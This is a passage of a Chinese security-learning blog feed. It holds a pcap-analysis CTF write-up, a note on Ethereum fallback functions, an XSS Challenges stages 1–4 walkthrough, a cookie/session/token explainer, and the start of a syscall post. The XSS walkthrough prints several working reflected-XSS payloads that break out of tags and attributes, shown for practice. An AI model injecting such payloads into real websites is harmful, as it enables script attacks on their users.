的使用</strong></li><li><strong>Winhex 的使用</strong></li></ul></blockquote><h4 id="font-color-navy2题目要求font-11"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-11"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-51.png" alt></p><h4 id="font-color-navy3解题步骤font-7"><a class="markdownIt-Anchor" href="#font-color-navy3解题步骤font-7"></a> <font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，发现附件是一个流量包，初猜那么这道题可能是一个流量包分析题，打开流量包，发现几乎都是 TCP 和 HTTP 组成，那么先尝试一下搜索一下 flag 关键词，看看是否有结果，搜索结果如下：</p><p><img src="/images/91-52.png" alt></p></li><li><p>追踪一下 flag.txt 文件的 TCP 流，看看传输的是什么数据：</p><p><img src="/images/91-53.png" alt></p><p>大略的看了一下这个流中的数据，发现结尾处是 jpg 图片的二进制结尾 “FFD9”，根据已有的经验找到 jpg 开头的 “FFD8” 格式：</p><p><img src="/images/91-54.jpg" alt></p></li><li><p>将十六进制的数据放到 “Winhex” 中，并保存格式为 “jpg” 的图片，如下图：</p><p><img src="/images/91-55.jpg" alt></p><p>将图片中的文字提交，发现提交的不对，说明这不是我们想求的 flag。</p></li><li><p>用 foremost 分离流量包，得到两个文件：audit.txt 和 zip 压缩包，打开 audit.txt 文件，得到如下信息：</p><p><img src="/images/91-56.png" alt></p></li><li><p>下一步解压压缩包，却发现需要解压密码，那么就想到了前面所得图片中的信息，输入之后进行解压，解压成功，得到 flag 文件：</p><p><img src="/images/91-57.png" alt></p></li></ol></blockquote><hr>2020-02-09 更新]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-pdffont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-pdffont&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、PDF&lt;/font&gt;&lt;/h3&gt;
      
    
    </summary>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="misc" scheme="https://muzibing.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>以太坊智能合约漏洞 | Fallback函数</title>
    <link href="https://muzibing.github.io/2019/11/23/2019.11.23%EF%BC%8890%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/23/2019.11.23（90）/</id>
    <published>2019-11-22T16:00:00.000Z</published>
    <updated>2019-11-24T14:24:36.089Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-colorbrown一-fallback-函数介绍font"><a class="markdownIt-Anchor" href="#font-colorbrown一-fallback-函数介绍font"></a> <font color="brown">一、Fallback 函数介绍</font></h3><blockquote><p>合约可以有一个未命名的函数。这个函数<strong>不能有参数也不能有返回值</strong>，并且必须具有外部可见性。如果没有其他函数与给定的函数标识符匹配（或者根本没有提供任何数据），则在调用合同时执行该函数。</p><p><br>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币并将其添加到合同的总余额中，<code>fallback</code> 函数必须标记为 <code>payable</code>。 如果不存在这样的函数，则合约不能通过常规交易接收以太币，并引发异常。</p><p><br>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p><p><br>具体来说，以下操作会消耗比 fallback 函数更多的 gas：</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p><br>请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。</p><p><br>除此之外，我们还可以这样理解 <code>fallback</code>  函数：</p><blockquote><p>If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names.</p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-colorbrown一-fallback-函数介绍font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-colorbrown一-fallback-函数介绍font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;
      
    
    </summary>
    
    
      <category term="区块链" scheme="https://muzibing.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="智能合约漏洞" scheme="https://muzibing.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenge（Stage1-4）writeup</title>
    <link href="https://muzibing.github.io/2019/11/19/2019.11.19%EF%BC%8889%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/19/2019.11.19（89）/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-19T12:25:28.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目链接：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges（共19关）</a></p></blockquote><h3 id="font-colorbrownstage-1font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-1font"></a> <font color="brown">Stage #1</font></h3><h4 id="font-colornavy1-题目font"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-1.png" alt></p><h4 id="font-colornavy2-相关知识点font"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>XSS 的类型</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 首先看一下是否存在 XSS 攻击</p><p><img src="/images/89-2.png" alt></p><p>⚁ 首次尝试填入信息：</p><p><img src="/images/89-3.png" alt></p><p>▣ 可以从上图中看出，我们写入的 <code>Hello World</code> 被放在了 <code>&lt;b&gt; &lt;/b&gt;</code> 标签中，我们可以在这个标签中进行 <code>xss</code> 攻击，脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/ 之所以用 document.domain 是因为题目中的提示</span></span><br></pre></td></tr></table></figure><blockquote><p>▣ 点击 <code>search</code> 之后，窗口会给我们弹出一个提示框，如下：</p><p><img src="/images/89-4.png" alt></p><p>这就代表着我们成功的对该网页进行了 <code>xss</code> 攻击，下面让我们看一下源码，看一下浏览器是怎么渲染我们的输入：</p><p><img src="/images/89-5.png" alt></p></blockquote><h3 id="font-colorbrownstage-2font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-2font"></a> <font color="brown">Stage #2</font></h3><h4 id="font-colornavy1-题目font-2"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-2"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-6.png" alt></p><h4 id="font-colornavy2-相关知识点font-2"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-2"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>close the current tag and add SCRIPT tag…</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-2"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-2"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初尝试：先输入数据，看看网页源码<br><img src="/images/89-7.png" alt></p><p>▣ 从上图可以看出，我们输入的 <code>Hello World</code> 赋值给了 <code>&lt;input&gt;</code> 标签的 <code>value</code> 值，那么我们根据提示和第一次的尝试，可以对 <code>value</code> 标签进行闭合，然后进行 <code>xss</code> 攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1: <span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-8.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2: <span class="string">" onclick/onmouseoover=alert(document.domain)&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-9,png" alt></p><blockquote><p>在这里简单的介绍一下 <code>onclick</code>、<code>onmousedown</code>、<code>onmouseup</code>、<code>onmouseout</code>、<code>onmouseenter</code>、<code>onmouseleave</code>  和  <code>onmouseover</code>  的功能：</p><ul><li><code>onclick</code> ：在鼠标左健点击弹起之后触发的事件，即一次完整的鼠标点击过程。过程完成瞬间触发函数</li><li><code>onmouseover</code> ：属性在鼠标指针移动到元素上时触发</li><li><code>onmousedown</code> ：事件会在鼠标按键被按下时发生</li><li><code>onmouseup</code> ：事件会在松开鼠标按键时触发</li><li><code>onmouseout</code> ：属性在鼠标指针移动到元素外时触发</li><li><code>onmouseenter</code> ：属性在鼠标指针移动到元素上时触发，onmouseover和onmouseenter唯一的区别是 onmouseenter 事件不支持冒泡</li><li><code>onmouseleave</code> ：性在鼠标指针移动到元素外时触发， onmouseout和onmouseleave唯一的区别是 onmouseleave 事件不支持冒泡 。</li></ul></blockquote><h3 id="font-colorbrownstage-3font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-3font"></a> <font color="brown">Stage #3</font></h3><h4 id="font-colornavy1-题目font-3"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-3"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-10.png" alt></p><h4 id="font-colornavy2-相关知识点font-3"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-3"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>The input in text box is properly escaped.</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-3"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-3"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初试 <code>Hello World</code> ：</p><p><img src="/images/89-11.png" alt></p><p>▣ 从上图可以看到，我们输入 <code>Hello World</code> 以后，网页显示了两个内容：</p><p>       <code>&lt;b&gt; &quot;Hellow World&quot; &lt;/b&gt;</code></p><p>       <code>&lt;b&gt; Japan &lt;/b&gt;</code></p><p>我们先尝试对第一处的进行标签闭合，如下图：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-12.png" alt></p><p>▣ 我们从上图看到，我们的 payload 没有被执行，说明该处不能够进行 xss 攻击，那么我们尝试修改第二处的值，也就是 <code>Japan</code> 的值（这个的实现我们可以用 <code>burp</code> 工具进行）：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain&gt;&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-13.png" alt></p><p>▣ 从下图的源码可以看到我们成功的执行了我们的脚本：</p><p><img src="/images/89-14.png" alt></p></blockquote><h3 id="font-colorbrownstage-4font"><a class="markdownIt-Anchor" href="#font-colorbrownstage-4font"></a> <font color="brown">Stage #4</font></h3><h4 id="font-colornavy1-题目font-4"><a class="markdownIt-Anchor" href="#font-colornavy1-题目font-4"></a> <font color="navy">① 题目</font></h4><p><img src="/images/89-15.png" alt></p><h4 id="font-colornavy2-相关知识点font-4"><a class="markdownIt-Anchor" href="#font-colornavy2-相关知识点font-4"></a> <font color="navy">② 相关知识点</font></h4><blockquote><ul><li>invisible input field</li></ul></blockquote><h4 id="font-colornavy3-解题步骤font-4"><a class="markdownIt-Anchor" href="#font-colornavy3-解题步骤font-4"></a> <font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 我们可以看出，这道题目和上一道题目没有太大的区别，我们再通过 <code>burp</code> 对 <code>&lt;b&gt;</code> 两处可能存在的 <code>xss</code> 攻击进行尝试构建我们的脚本：</p><p><img src="/images/89-16.png" alt></p><p>执行结果如下:</p><p><img src="/images/89-17.png" alt></p><p>▣ 我们在两处都写入了我们的脚本，但是都没有被执行，在用 <code>burp</code> 抓包的过程中，我们发现，这道题比上一道题多了一个 <code>Hack</code>，那么我们是不是可以通过这个来实现 <code>xss</code> 攻击呢？我们先看一下 <code>Hack</code> 在页面哪个位置，如下图：</p><p><img src="/images/89-18.png" alt></p><blockquote><p>☛ 在这里我们补充一个知识点：<code>input</code> 的 <code>type</code> 属性</p><p>          ● <code>button</code>：定义可点击按钮（多数情况下，用于通过 JavaScript 启动脚本）</p><p>          ● <code>checkbox</code>：定义复选框</p><p>          ● <code>file</code>：定义输入字段和 &quot;浏览&quot;按钮，供文件上传</p><p>          ● <code>hidden</code>：定义隐藏的输入字段</p><p>          ● <code>image</code>： 定义图像形式的提交按钮</p><p>          ● <code>password</code>：定义密码字段。该字段中的字符被掩码</p><p>          ● <code>radio</code>：定义单选按钮</p><p>          ● <code>reset</code>：定义重置按钮。重置按钮会清除表单中的所有数据</p><p>          ● <code>submit</code>：定义提交按钮。提交按钮会把表单数据发送到服务器</p><p>          ● <code>text</code>：定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符</p></blockquote><p>▣ 从上图我们可以得到，有一个 <code>&lt;input&gt;</code> 标签被隐藏掉了，所以我们在网页中无法找见它，但是我们可以在 <code>burp</code> 改包，来进行 <code>xss</code>  攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>效果如下图：</p><p><img src="/images/89-19.png" alt></p><p>▣ 我们点击 <code>Forward</code> 以后，可以看到我们成功的执行了 <code>xss</code> 攻击：</p><p><img src="/images/89-20.png" alt></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS Challenges（共19关）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Cookie、Session、Token那点事儿（转载）</title>
    <link href="https://muzibing.github.io/2019/11/07/2019.11.07%EF%BC%8888%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/07/2019.11.07（88）/</id>
    <published>2019-11-06T16:00:00.000Z</published>
    <updated>2019-11-07T05:13:11.297Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>来自：简书，作者：骑小猪看流星</strong></p><p>链接：<a href="https://www.jianshu.com/p/bd1be47a16c1" target="_blank" rel="noopener">https://www.jianshu.com/p/bd1be47a16c1</a></p></blockquote><h3 id="font-color-brown一-什么是cookiefont"><a class="markdownIt-Anchor" href="#font-color-brown一-什么是cookiefont"></a> <font color="brown">一、什么是Cookie？</font></h3><blockquote><p>Cookie 技术产生源于 HTTP 协议在互联网上的急速发展。随着互联网时代的策马奔腾，带宽等限制不存在了，人们需要更复杂的互联网交互活动，就必须同服务器保持活动状态（简称：保活）。</p><p><br>于是，在浏览器发展初期，为了适应用户的需求技术上推出了各种保持 Web 浏览状态的手段，其中就包括了 Cookie 技术。Cookie 在计算机中是个存储在浏览器目录中的文本文件，当浏览器运行时，存储在 RAM 中发挥作用 （此种 Cookies 称作 Session Cookies），一旦用户从该网站或服务器退出，Cookie 可存储在用户本地的硬盘上 （此种 Cookies 称作 Persistent Cookies）。</p><p><br>Cookie 起源：1993 年，网景公司雇员 Lou Montulli 为了让用户在访问某网站时，进一步提高访问速度，同时也为了进一步实现个人化网络，发明了今天广泛使用的 Cookie。（所以，适当的偷懒也会促进人类计算机发展史的一小步~）</p><p><br>Cookie时效性：目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p><p><br>Cookie使用限制：Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p><p><br>执行流程：</p><blockquote><p>A：首先，客户端会发送一个http请求到服务器端。</p><p>B： 服务器端接受客户端请求后，发送一个http响应到客户端，这个响应头，其中就包含Set-Cookie头部。</p><p>C：在客户端发起的第二次请求（注意：如果服务器需要我们带上Cookie，我们就需要在B步骤上面拿到这个Cookie然后作为请求头一起发起第二次请求），提供给了服务器端可以用来唯一标识客户端身份的信息。这时，服务器端也就可以判断客户端是否启用了cookies。尽管，用户可能在和应用程序交互的过程中突然禁用cookies的使用，但是，这个情况基本是不太可能发生的，所以可以不加以考虑，这在实践中也被证明是对的。</p></blockquote><p><br>为了方便理解，可以先看下这张流程执行图加深概念:</p><p><img src="/images/88-1.png" alt></p><p>那么，在浏览器上面的请求头和Cookie在那？下图给大家截取了其中一种:</p><p><img src="/images/88-2.png" alt></p></blockquote><h3 id="font-color-brown二-sessionfont"><a class="markdownIt-Anchor" href="#font-color-brown二-sessionfont"></a> <font color="brown">二、Session</font></h3><blockquote><p>Session是对于服务端来说的，客户端是没有Session一说的。Session是服务器在和客户端建立连接时添加客户端连接标志，最终会在服务器软件（Apache、Tomcat、JBoss）转化为一个临时Cookie发送给给客户端，当客户端第一请求时服务器会检查是否携带了这个Session（临时Cookie），如果没有则会添加Session，如果有就拿出这个Session来做相关操作。</p><p><br>在这里引用别人家的一个小故事来加深印象：</p><blockquote><p>在说session是啥之前，我们先来说说为什么会出现session会话，它出现的机理是什么？</p><p><br>我们知道，我们用浏览器打开一个网页，用到的是HTTP协议，了解计算机的应该都知道这个协议，它是无状态的，什么是无状态呢？就是说这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但是这种无状态的的好处是快速。所以就会带来一个问题就是，我希望几个请求的页面要有关联，比如：<a href="http://xn--www-lp6eu21c.a.com/login.php%E9%87%8C%E9%9D%A2%E7%99%BB%E9%99%86%E4%BA%86%EF%BC%8C%E6%88%91%E5%9C%A8www.a.com/index.php" target="_blank" rel="noopener">我在www.a.com/login.php里面登陆了，我在www.a.com/index.php</a> 也希望是登陆状态，但是，这是2个不同的页面，也就是2个不同的HTTP请求，这2个HTTP请求是无状态的，也就是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了！</p><p><br>那咋搞呢？我不可能这2个页面我都去登陆一遍吧。或者用笨方法这2个页面都去查询数据库，如果有登陆状态，就判断是登陆的了。这种查询数据库的方案虽然可行，但是每次都要去查询数据库不是个事，会造成数据库的压力。所以正是这种诉求，这个时候，一个新的客户端存储数据方式出现了：cookie。cookie是把少量的信息存储在用户自己的电脑上，它在一个域名下是一个全局的，只要设置它的存储路径在域名www.a.com下 ，那么当用户用浏览器访问时，php就可以从这个域名的任意页面读取cookie中的信息。<a href="http://xn--www-0h9d0q42lp0lnue67gktjcih6pax98svx0c.a.com/login.php%E9%A1%B5%E9%9D%A2%E7%99%BB%E9%99%86%E4%BA%86%EF%BC%8C%E6%88%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8www.a.com/index.php%E8%8E%B7%E5%8F%96%E5%88%B0%E8%BF%99%E4%B8%AA%E7%99%BB%E9%99%86%E4%BF%A1%E6%81%AF%E4%BA%86%E3%80%82" target="_blank" rel="noopener">所以就很好的解决了我在www.a.com/login.php页面登陆了，我也可以在www.a.com/index.php获取到这个登陆信息了。</a></p><p><br>同时又不用反复去查询数据库。虽然这种方案很不错，也很快速方便，但是由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了。</p><p><br> Session 就是在一次会话中解决2次HTTP的请求的关联，让它们产生联系，让2两个页面都能读取到找个这个全局的session信息。session信息存在于服务器端，所以也就很好的解决了安全问题。</p></blockquote></blockquote><h3 id="font-color-brown三-tokenfont"><a class="markdownIt-Anchor" href="#font-color-brown三-tokenfont"></a> <font color="brown">三、Token</font></h3><blockquote><p>token是用户身份的验证方式，我们通常叫它：令牌。最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。还可以把不变的参数也放进token，避免多次查库。</p><p><br>应用场景：</p><p><br>A：当用户首次登录成功（注册也是一种可以适用的场景）之后, 服务器端就会生成一个 token 值，这个值，会在服务器保存token值(保存在数据库中)，再将这个token值返回给客户端.</p><p>B：客户端拿到 token 值之后,进行本地保存。（SP存储是大家能够比较支持和易于理解操作的存储）</p><p>C：当客户端再次发送网络请求(一般不是登录请求)的时候,就会将这个 token 值附带到参数中发送给服务器.</p><p>D：服务器接收到客户端的请求之后,会取出token值与保存在本地(数据库)中的token值做对比</p><p><br>对比一：如果两个 token 值相同， 说明用户登录成功过!当前用户处于登录状态!</p><p>对比二：如果没有这个 token 值, 则说明没有登录成功.</p><p>对比三：如果 token 值不同: 说明原来的登录信息已经失效,让用户重新登录.</p></blockquote><h3 id="font-color-brown四-三者的区别font"><a class="markdownIt-Anchor" href="#font-color-brown四-三者的区别font"></a> <font color="brown">四、三者的区别</font></h3><h4 id="font-color-navy1-cookie和session的区别font"><a class="markdownIt-Anchor" href="#font-color-navy1-cookie和session的区别font"></a> <font color="navy">1. Cookie和Session的区别</font></h4><blockquote><ol><li>cookie数据存放在客户的浏览器上，session数据放在服务器上。</li><li>cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗,考虑到安全应当使用session。</li><li>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能,考虑到减轻服务器性能方面，应当使用cookie。</li><li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</li><li>所以个人建议：<ul><li>将登陆信息等重要信息存放为session</li><li>其他信息如果需要保留，可以放在cookie中</li></ul></li></ol></blockquote><h4 id="font-color-navy2-token-和-session-的区别font"><a class="markdownIt-Anchor" href="#font-color-navy2-token-和-session-的区别font"></a> <font color="navy">2. Token 和 Session 的区别</font></h4><blockquote><p>Session和 token并不矛盾，作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击，而session就必须靠链路层来保障通讯安全了。如上所说，如果你需要实现有状态的会话，仍然可以增加session来在服务器端保存一些状态。</p><p><br>App通常用restful api跟server打交道。Rest是stateless的，也就是app不需要像browser那样用cookie来保存session,因此用session token来标示自己就够了，session/state由api server的逻辑处理。如果你的后端不是stateless的rest api,那么你可能需要在app里保存session.可以在app里嵌入webkit,用一个隐藏的browser来管理cookie session.</p><p><br>Session是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。所谓Session认证只是简单的把User信息存储到Session里，因为SID的不可预测性，暂且认为是安全的。这是一种认证手段。而Token，如果指的是OAuth Token或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对App。其目的是让 某App有权利访问 某用户 的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它 用户 上。转过来说Session。Session只提供一种简单的认证，即有此SID，即认为有此User的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方App。所以简单来说，如果你的用户数据可能需要和第三方共享，或者允许第三方调用API接口，用Token。如果永远只是自己的网站，自己的App，用什么就无所谓了。</p><p><br>token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p></blockquote><h3 id="font-color-brown四-相关文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-相关文章font"></a> <font color="brown">四、相关文章</font></h3><blockquote><ol><li><a href="https://mp.weixin.qq.com/s/b8h6_3CMlwsE8PtkrPr9FA" target="_blank" rel="noopener">Cookie、Session、Token那点事儿</a></li><li><a href="https://segmentfault.com/a/1190000017831088" target="_blank" rel="noopener">彻底弄懂session，cookie，token</a></li><li><a href="https://www.cnblogs.com/hwlong/p/9224251.html" target="_blank" rel="noopener">★★★★  Cookie、Session、Token  ★★★★</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;来自：简书，作者：骑小猪看流星&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://www.jianshu.com/p/bd1be47a16c1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>有关内核调用问题和预编译指令</title>
    <link href="https://muzibing.github.io/2019/11/05/2019.11.05%EF%BC%8887%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/05/2019.11.05（87）/</id>
    <published>2019-11-04T16:00:00.000Z</published>
    <updated>2019-11-06T03:58:12.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-知识点摘要font"><a class="markdownIt-Anchor" href="#font-color-brown一-知识点摘要font"></a> <font color="brown">一、知识点摘要</font></h3><blockquote><ol><li>系统调用 int 80h 中断</li><li>#ifdef ……# endif 的含义和用法</li></ol></blockquote><h3 id="font-color-brown二-知识点介绍font"><a class="markdownIt-Anchor" href="#font-color-brown二-知识点介绍font"></a> <font color="brown">二、知识点介绍</font></h3><h4 id="font-color-navy1int-80h-中断font"><a class="markdownIt-Anchor" href="#font-color-navy1int-80h-中断font"></a> <font color="navy">1.int 80h 中断</font></h4><blockquote><p><font color="orange">1) 什么是 system call?</font></p><p>        system call 是指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。system call 提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信 。(<a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%5D(https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F)">操作系统—WIKI</a>)</p><p><br><font color="orange">2) 什么是 int 80h 中断？</font></p><p>        Linux 的 system call 就是通过<code>int 80h</code>来实现的，<code>int 80h</code> 是通过<font color="red">系统调用号</font>来区分入口的函数。</p><p><br><font color="orange">3) 操作系统实现 <code>system call</code> 的基本过程:</font></p><p>        ①  应用程序调用库函数（API）；</p><p>        ②  API 将系统调用号存入 eax，然后通过中断调用使系统进入内核态；</p><p>        ③  内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p><p>        ④  系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</p><p>        ⑤  中断处理函数返回到 API 中；</p><p>        ⑥  API 将 eax 返回给应用程序。<br><br><font color="orange">4) 系统调用号</font></p><p>        我们再来想几个小问题：</p><p>            ※ 系统调用号定义在哪里？</p><p>              Linux 的系统调用号定义在了 <code>/usr/include/asm/unistd.h</code> 文件中，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta"># cat /usr/<span class="meta-keyword">include</span>/asm/unistd.h</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_H</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">/* x32 syscall flag bit */</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __X32_SYSCALL_BIT0x40000000</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">ifdef</span> __i386__</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">elif</span> defined(__ILP32__)</span></span><br><span class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_x32.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span 